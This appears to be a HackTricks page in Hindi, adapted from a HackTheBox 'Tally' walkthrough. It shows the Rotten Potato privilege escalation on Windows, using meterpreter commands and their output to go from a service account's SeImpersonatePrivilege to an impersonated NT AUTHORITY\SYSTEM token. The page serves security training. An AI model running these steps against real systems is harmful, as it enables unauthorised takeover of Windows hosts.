# RottenPotato

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो करें**.
* **अपनी हैकिंग ट्रिक्स साझा करें PRs जमा करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में.

</details>

इस पृष्ठ की जानकारी [इस पोस्ट से](https://www.absolomb.com/2018-05-04-HackTheBox-Tally/) निकाली गई थी

सर्विस अकाउंट्स आमतौर पर विशेष विशेषाधिकार (SeImpersonatePrivileges) रखते हैं और इसका उपयोग विशेषाधिकार बढ़ाने के लिए किया जा सकता है।

[https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)

मैं इस एक्सप्लॉइट कैसे काम करता है, इसके विवरण में नहीं जाऊंगा, ऊपर दिया गया लेख इसे मुझसे कहीं बेहतर समझाता है।

चलिए meterpreter के साथ हमारे विशेषाधिकारों की जांच करते हैं:
```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
```
बहुत अच्छा, ऐसा लगता है कि हमला करने के लिए हमारे पास जरूरी अधिकार हैं। चलिए `rottenpotato.exe` अपलोड करते हैं।

हमारे meterpreter सत्र पर वापस जाकर हम `incognito` एक्सटेंशन लोड करते हैं।
```
meterpreter > use incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will beavailable
Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
NT SERVICE\SQLSERVERAGENT
NT SERVICE\SQLTELEMETRY
TALLY\Sarah

Impersonation Tokens Available
========================================
No tokens available
```
हम देख सकते हैं कि हमारे पास वर्तमान में कोई Impersonation Tokens नहीं हैं। आइए Rotten Potato एक्सप्लॉइट चलाएं।
```
meterpreter > execute -f rottenpotato.exe -Hc
Process 3104 created.
Channel 2 created.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will beavailable
Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
NT SERVICE\SQLSERVERAGENT
NT SERVICE\SQLTELEMETRY
TALLY\Sarah

Impersonation Tokens Available
========================================
NT AUTHORITY\SYSTEM
```
हमें तुरंत टोकन का अनुकरण करना होगा नहीं तो वह गायब हो जाएगा।
```
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
[-] Warning: Not currently running as SYSTEM, not all tokens will beavailable
Call rev2self if primary process token is SYSTEM
[-] No delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
सफलता! हमें हमारा SYSTEM shell मिल गया है और हम root.txt फाइल प्राप्त कर सकते हैं!

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो करें**.
* **अपनी हैकिंग ट्रिक्स साझा करें PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में.

</details>
